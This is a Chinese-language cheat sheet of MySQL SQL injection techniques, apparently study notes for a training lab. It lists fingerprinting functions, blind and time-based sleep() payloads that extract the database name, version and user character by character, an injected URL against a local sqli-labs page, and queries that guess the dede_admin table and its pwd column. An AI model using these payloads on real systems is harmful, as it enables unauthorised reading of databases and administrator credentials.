# sql注入常用语句

select @@VERSION || version()   : 查询数据库版本
user()  :    返回当前数据库连接使用的用户
database()  :    返回当前数据库连接使用的数据库
concat  :   返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。
concat_ws   :     concat_ws的第一个参数是连接字符串的分隔符，concat_ws(char(32,58,32),user(),database(),version())
char()  :   mysql的char函数将十进制ASCII码转化成字符
@@datadir   :   读取数据库路径
@@basedir MYSQL :   获取安装路径
show variables like '%secure%' :   查询是否多mysql导出做限制
@@version_ compile_ os  :   操作系统版本

## 双注入查询需要理解四个函数/语句
1. Rand() //随机函数
2. Floor() //取整函数
3. Count() //汇总函数
4. Group by clause //分组语句

盲注需要掌握一些MySQL的相关函数：
length(str)：返回str字符串的长度。
substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
mid(str,pos,len):跟上面的一样，截取字符串
ascii(str)：返回字符串str的最左面字符的ASCII代码值。
ord(str):同上，返回ascii码
if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

首先要记得常见的ASCII，A:65,Z:90 a:97,z:122,  0:48, 9:57

首先select database()查询数据库
ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码
ascii(substr((select database()),1,1))>64：ascii大于64就返回true，if就返回1，否则返回0



## url编码
```
‘#’ url编码后就是%23
‘ ’ url编码后就是%20
‘'’ url编码后就是%27
```
## information_schema数据库
```
information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。通过information_schema我们可以窥透整个MySQL实例的运行情况，可以了结MySQL实例的基本信息，甚至优化调优，维护数据库等，可以说是真正的一部百科全书。

information_schema数据库表说明:
-----重要
SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型等，show databases的结果取之此表。
TABLES表：储存mysql中的表信息（包括视图）。详细表述了（数据库名这一列，这样才能找到哪个数据库有哪些表嘛）某个表属于哪个schema，表类型，表引擎，表有多少行,创建时间等信息。是show tables from schemaname的结果取之此表。
COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息（包括数据库名和表名称这两列）。是show columns from schemaname.tablename的结果取之此表。
--------

STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。
USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。
SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。
TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。
COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。
CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。
COLLATIONS表：提供了关于各字符集的对照信息。
COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。
TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。
KEY_COLUMN_USAGE表：描述了具有约束的键列。
ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。
VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。
TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表
 
```
## 查看数据库的长度
```
http://192.168.1.102/sqli/Less-8/index.php?id=1'  and if(length(database())=8, 1, 0) %23  
```





## 延迟注入
```
延迟注入：
select id from links where id=1 and sleep(5);

延迟注入获取长度：
//延迟注入，如果mysql的版本长度等于 11，就延迟5秒显示；
select id from links where id=1 and sleep(  if( length(( select @@version )) = 11,5,0 ) );

判断用户的第一个字符的asc码是多少：
//延迟注入" sleep "，如果 用户的名字第一个长度" ORD( mid( ( select user() ),1,1)) "
select id from links where id=1 and sleep(  if( ( ORD( mid( ( select user() ),1,1)) ) = 11,5,0 ) );
```




猜表一般的表的名称:存在返回数据
SELECT * FROM `dede_admin` WHERE 1 AND 0 <> ( SELECT count( * ) FROM dede_admin ) LIMIT 0 , 30

猜表数目：通过大小与判断，真返回数据
SELECT * FROM `dede_admin` WHERE 1 AND 2 > ( SELECT count( * ) FROM dede_admin ) LIMIT 0 , 30

猜解字段中有几个数据
SELECT * FROM `dede_admin` WHERE 1 and 1<(select count(*) from `dede_admin` where LENGTH(`pwd`)>0)

